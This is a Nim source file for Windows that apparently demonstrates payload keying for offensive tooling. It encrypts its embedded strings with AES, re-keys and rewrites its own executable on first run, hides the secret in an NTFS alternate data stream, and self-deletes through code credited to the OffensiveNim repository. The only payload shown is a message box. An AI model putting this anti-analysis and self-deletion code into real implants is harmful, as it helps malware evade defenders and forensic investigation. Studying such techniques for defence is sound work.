import winim
import nimcrypto
from winim/lean import MessageBox
import zippy
import strutils except fromHex
import std/sha1
import std/base64
from os import getAppFileName
import streams
import random

var 
    iv: seq[byte] = fromHex("4C4E504B4C434D434753444C45454F50") #Replace me
    drmUniquePattern = encode("~~~") #Replace me
    key = "28CE604DA2F2101F03003D968B4DBF9D5E933E6B" #Replace me
    keyDRM = "~~~CB654C16F9807F927848093F3BB338CBC694C819~~~" #Replace me
    keyDRMPlaceHolderHash = "F2CD8D409CB7E0ABD6962201EE82BB3931B42A19" #Replace me
    msgTitle = "~~~27237F16DF5A80E9A66F963C9A8711C81DE0DC429E10F6F6DFA200719F9DA2~~~" #Replace me
    msgContent = "~~~27237F16DF5A80E9A66F96389A8311CE1DADC0488701E7A0494AE92DC551E3F2C3C17A~~~" #Replace me
    
var
    secret = ""
    appliedDRM = false
    DS_STREAM_RENAME = newWideCString(":Mr.Bones")

 #Forward declarations
proc applyDRM()
proc getKey(): string
proc deleteItself()
proc getRandomStr: string
proc getBytesFromFile(path: string): seq[byte]
proc decryptWrapper(sc: string): seq[byte]
proc flushImgToExe(image: seq[byte] )

proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

#Crypto and DRM section
proc cryptUtils(data: seq[byte], customKey: string): string =
    var
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        plaintext = newSeq[byte](len(data))
        enctext = newSeq[byte](len(data))

    copyMem(addr plaintext[0], unsafeAddr data[0], len(data))

    var expandedkey = sha256.digest(customKey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
    ectx.init(key, iv)
    ectx.encrypt(plaintext, enctext)
    ectx.clear()
    return toHex(enctext)
     
proc cryptUtils(input: string, envkey: string): seq[byte] =
    var
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        enctext: seq[byte] = fromHex(input.replace(drmUniquePattern, ""))
        dectext = newSeq[byte](len(enctext))
        expandedkey = sha256.digest(envkey)

    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()
    try:
        return uncompress(dectext)
    except:
        echo "[x] DRM error. Self Deleting."
        deleteItself()
        quit()

proc getOriginalKey(): string = 
    return key.replace(drmUniquePattern, "")

proc getKeyDRM(): string =
    try:
        secret = readFile(getAppFileName() & ":MrBones")
    except:
        discard
    return $(secureHash(getOriginalKey() & secret))

proc getKey(): string = 
    if appliedDRM == false and $secureHash(keyDRM.replace(drmUniquePattern, "")) == keyDRMPlaceHolderHash: #First run
        echo "[!] Applying DRM"
        applyDRM()
        return key.replace(drmUniquePattern, "")
    elif appliedDRM == true and $secureHash(keyDRM) == keyDRMPlaceHolderHash: #Still first run, using original key
        return key.replace(drmUniquePattern, "")
    elif appliedDRM == true and $secureHash(keyDRM) != keyDRMPlaceHolderHash: #Still first run, using original key
        return key.replace(drmUniquePattern, "")
    elif appliedDRM == false and $secureHash(keyDRM) != keyDRMPlaceHolderHash: #subsequent run, DRM key is used
        echo "[!!] DRM Mode"
        return getKeyDRM()
    else:
        return key

proc generateKeyDRM() =
    secret = getRandomStr()
    keyDRM = $(secureHash(getKey() & secret))

proc applyDRM() =
    appliedDRM = true
    generateKeyDRM()
    #After generating a new key on first run, encrypted values are identified in the file on disk
    #and are decrypted before being rewritten on disk reencrypted with the new key
    var fileBytes = getBytesFromFile(getAppFileName())
    var prefixIndx: int
    var suffixIndx: int
    var currentIndx: int
    for i in 0 .. fileBytes.len - 1:
        if i > currentIndx:
            var byteStringi = newString(3)
            copyMem(byteStringi[0].addr, fileBytes[i].unsafeAddr, 3)
            if $byteStringi == $drmUniquePattern:
                prefixIndx = i
                for j in i + 3 .. fileBytes.len - 1:
                    var byteStringj = newString(3)
                    copyMem(byteStringj[0].addr, fileBytes[j].unsafeAddr, 3)

                    if $byteStringj == $drmUniquePattern:
                        suffixIndx = j
                        currentIndx = suffixIndx
                        var byteString = newString(suffixIndx - (prefixIndx + 3))
                        copyMem(byteString[0].addr, fileBytes[prefixIndx + 3].unsafeAddr, suffixIndx - (prefixIndx + 3))

                        if $secureHash(byteString) == keyDRMPlaceHolderHash:
                            copyMem(fileBytes[prefixIndx + 3].addr, keyDRM[0].addr, len(keyDRM))
                            break
                        else:
                            var decryptedValue = decryptWrapper(byteString)
                            var byteSeqstring = newString(len(decryptedValue))
                            echo byteSeqstring
                            copyMem(byteSeqstring[0].addr, decryptedValue[0].addr, len(decryptedValue))
                            var reencryptedValue = cryptUtils(compress(toByteSeq(byteSeqstring), 9), keyDRM) #secret isn't yet on disk. Need to store the drmKey in memory during first run
                            copyMem(fileBytes[prefixIndx + 3].addr, reencryptedValue[0].addr, len(reencryptedValue))
                            break
        
    flushImgToExe(fileBytes)
    writeFile(getAppFileName() & ":MrBones", secret)
    
proc decryptWrapper(sc: string): seq[byte] =
    return cryptUtils(sc, getKey())
#End of sextion

#Utility functions section
proc getBytesFromFile(path: string): seq[byte] =
    try:
        var
            s = newFileStream(path, fmRead)
            valSeq = newSeq[byte]()
        while not s.atEnd:
            let element = s.readUInt8
            valSeq.add(element)
        s.close()
        return valSeq
    except:
        echo "! ", path, " was not found !"
        quit(1)

proc getRandomStr: string =
    for _ in 0 .. 10:
        add(result, char(rand(int('A') .. int('z'))))

proc flushImgToExe(image: seq[byte] ) =
    deleteItself()

    var szTarget = getAppFileName()
    var localImagePtr = image #Can't directly use image
    
    var f = newFileStream(szTarget, fmWrite)
    if not f.isNil:
        for current_byte in localImagePtr:
            f.write current_byte
    f.flush
#Section end

#Begin Section for Self Deletion. Credits to: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/self_delete_bin.nim
proc ds_open_handle(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = DS_STREAM_RENAME
    fRename.FileNameLength = sizeof(lpwStream).DWORD;
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE;

    return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)

proc deleteItself() =
    var  wcPath: array[MAX_PATH + 1, WCHAR]
    var  hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath));

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        quit(QuitFailure)

    if not ds_rename_handle(hCurrent).bool:
        quit(QuitFailure)

    CloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        quit(QuitFailure)

    CloseHandle(hCurrent)
#Section End

proc displayPopupMsg(): void =
    var
        decMsgTitle = toString(decryptWrapper(msgtitle))
        decMsgContent = toString(decryptWrapper(msgContent))

    MessageBox(0,decMsgContent,decMsgTitle,MB_ICONINFORMATION)

when isMainModule:
    drmUniquePattern = decode(drmUniquePattern) #The real pattern must not be found statically on disk or it will crash
    displayPopupMsg()
